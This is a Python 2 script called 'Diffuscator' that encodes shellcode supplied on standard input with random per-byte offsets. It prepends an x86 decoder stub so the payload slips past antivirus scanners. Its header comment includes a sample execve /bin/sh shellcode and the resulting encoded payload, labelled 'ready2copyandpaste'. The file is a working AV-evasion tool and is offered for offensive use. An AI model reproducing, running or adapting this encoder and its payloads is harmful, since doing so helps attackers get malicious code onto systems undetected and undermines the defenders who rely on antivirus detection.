#!/usr/bin/python

#
# Diffuscator v1.0 by dabooze / Dilsec
# http://dilsec.com
# @dab00ze
#
# Takes shellcode (binary) from STDIN and prepends diffuscate-decoder stub
# Will go undetected by AV until the decoder stub signature gets added :-)
#
# Licensed under CC 3.0 (http://creativecommons.org/licenses/by-sa/3.0/)
#
# (First tool ever written in Python by me, so any inefficiency is highly expected)
#
# Example call: echo -ne "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" | ./Diffuscator.py
#
# [*] L33t Diffuscator v1.0 by @dab00ze
# [*] Obfuscates your shellcode and prepends a decoder stub
# [*] Resulting hex sequence is a new, working shellcode with low AV detection rate
#
# [!] Please pass your shellcode (must not have ZER0's inside!) via STDIN
# [*] Original shellcode len: 25
# [*] Diffuscated code len: 84
# [*] Printing shellcode incl. decoder stub, ready2copyandpaste (tm)...
#
# "\xeb\x19\x5e\x8d\x3e\x31\xc0\x31\xdb\x31\xc9\x8a\x5c\x06\x01\x02"
# "\x1c\x06\x74\x0c\x88\x1f\x47\x04\x02\xeb\xf0\xe8\xe2\xff\xff\xff"
# "\x71\xc0\x8f\x31\x98\xb8\x49\x1f\x89\xa6\xbd\x72\xd3\xa0\x3d\x2b"
# "\xa7\xc1\xb0\x7f\xbc\xa6\xfe\x6b\x81\xed\x45\x44\x02\xe1\x17\x39"
# "\xb9\xd0\x34\xae\x1f\x34\x72\x17\xc1\x20\x35\x7b\x4e\xbd\xfc\xd1"
# "\x8a\xf6\x12\xee"
#

import random
import sys

decoder_stub = ("\xeb\x19\x5e\x8d\x3e\x31\xc0\x31\xdb\x31\xc9\x8a\x5c\x06\x01\x02\x1c\x06\x74\x0c\x88\x1f\x47\x04\x02\xeb\xf0\xe8\xe2\xff\xff\xff");

encoded_stub = ""
encoded_shellcode = ""

print
print '[*] L33t Diffuscator v1.0 by dab00ze'
print '[*] Obfuscates your shellcode and prepends a decoder stub'
print '[*] Resulting hex sequence is a new, working shellcode with low AV detection rate'
print
print '[!] Please pass your shellcode (must not have ZER0\'s inside!) via STDIN'

shellcode = sys.stdin.readline()

print '[*] Original shellcode len: %d' % len(bytearray(shellcode))

# tag the end of the shellcode
shellcode += "\x00"

for x in bytearray(shellcode) :

	# get random offset
	offset = random.randint(1,255)

	if int(x - offset) == 0:
		# avoid zeros! 
		offset = offset - 1

	# x = x - random offset
	new_x = int(x - offset)

	# print out new shellcode
	encoded_shellcode += '\\x'
	encoded_shellcode += '%02x' % ((new_x + (1 << 8)) % (1 << 8))	# ugly but we need to convert the negative val to 8bit hex

	# store random offset byte so that we can decode later
	encoded_shellcode += '\\x%02x' % offset

for x in bytearray(decoder_stub) :
	encoded_stub += '\\x'
	encoded_stub += '%02x' % x

print '[*] Diffuscated code len: %d' % (len(bytearray(encoded_stub+encoded_shellcode)) / 4)

print '[*] Printing shellcode incl. decoder stub, ready2copyandpaste (tm)...'
print
print '"' + encoded_stub + encoded_shellcode + '"'
print
